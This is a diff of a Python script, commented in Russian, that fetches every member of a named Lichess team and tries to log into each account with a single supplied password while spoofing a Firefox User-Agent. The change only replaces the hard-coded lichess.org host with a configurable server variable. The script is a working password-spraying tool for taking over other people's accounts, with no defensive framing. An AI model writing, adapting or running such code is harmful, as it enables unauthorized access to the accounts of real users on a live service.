@@ -6,7 +6,7 @@ from config import *
 
 def start(password, team):
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
-    r_m = requests.get('https://lichess.org/api/team/' + team + '/users')
+    r_m = requests.get(f'https://{SERVER}/api/team/' + team + '/users')
     users = r_m.json(cls=ndjson.Decoder)
 
     # Выводим сообщение, что список готов
@@ -25,7 +25,7 @@ def start(password, team):
 
         if (len(username) < 4): continue
 
-        r = requests.post("https://lichess.org/login",
+        r = requests.post(f"https://{SERVER}/login",
                           data={"username": username, "password": password, "remember": "true"},
                           headers={"X-Requested-With": "XMLHttpRequest",
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}) # пытатаемся войти в акк
